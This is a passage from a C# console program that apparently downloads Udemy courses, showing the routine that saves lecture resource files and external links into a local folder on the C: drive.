                        }


                    }



                    ++download_counter;
                    Console.Clear();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    continue;
                }

            }

            if (extraExists)
            {
                Console.WriteLine("\nDownloading Resource Files\n");
                download_extras();
                Console.Clear();
            }

            Console.WriteLine("Course Downloaded Successfully");

            Console.Clear();

            Console.WriteLine("Next Course Downloading Starts after 10 Seconds");
            Thread.Sleep(10000);
        }

        static void download_extras()
        {
            for (int i = 0; i < extras_downloadUrls.Count; i++)
            {


                try
                {

                    if (extras_type[i] == "File")
                    {
                        if (is_html[i] == false)
                        {
                            Uri url = new Uri(extras_downloadUrls[i]);

                            if (url.ToString().IndexOf(".pdf") != -1)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_names[i] + ".pdf");
                            }
                            else if (url.ToString().IndexOf(".zip") != -1)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_names[i] + ".zip");
                            }
                            else if (url.ToString().IndexOf(".txt") != -1)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_names[i] + ".txt");
                            }
                            else if (url.ToString().IndexOf(".rar") != -1)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_names[i] + ".rar");
                            }
                            else if (url.ToString().IndexOf(".doc") != -1)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_names[i] + ".doc");
                            }
                            else if (url.ToString().IndexOf(".docx") != -1)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_names[i] + ".docx");
                            }
                            else if (url.ToString().IndexOf(".ppt") != -1)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_names[i] + ".ppt");
                            }
                            else if (url.ToString().IndexOf(".pptx") != -1)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_names[i] + ".pptx");
                            }

                            else if (url.ToString().IndexOf(".pdf") == -1 && url.ToString().IndexOf(".zip") == -1 && url.ToString().IndexOf(".txt") == -1 && url.ToString().IndexOf(".rar") == -1 && url.ToString().IndexOf(".doc") == -1 && url.ToString().IndexOf(".docx") == -1 && url.ToString().IndexOf(".ppt") == -1 && url.ToString().IndexOf(".pptx") == -1)
                            {
                                myclient.DownloadFile(url, "c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_datanames[i]);
                            }

                        }
                        else if (is_html[i] == true)
                        {
                            viewHtml = new StreamWriter("c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + ".(File)" + extras_names[i] + ".html");

                            viewHtml.WriteLine(extras_downloadUrls[i]);
                            viewHtml.Close();
                        }
                    }
                    else if (extras_type[i] == "ExternalLink")
                    {
                        viewHtml = new StreamWriter("c:\\udemy\\" + courseName + @"\" + "Extras" + @"\" + extra_lectureid[i] + "." + extras_names[i] + ".html");

                        viewHtml.WriteLine(extras_downloadUrls[i]);
                        viewHtml.Close();
                    }


                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    continue;
                }

            }
        }

    }
}
